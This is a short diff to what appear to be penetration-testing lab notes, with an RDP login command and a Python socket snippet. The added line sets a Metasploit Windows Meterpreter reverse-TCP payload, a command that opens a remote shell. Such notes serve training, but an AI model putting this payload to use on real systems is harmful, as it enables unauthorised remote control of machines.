@@ -82,3 +82,4 @@ xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
   print s.recv(1024)   #print response
   s.close()         #close the connection
 ==================================================================
+set payload windows/meterpreter/reverse_Tcp
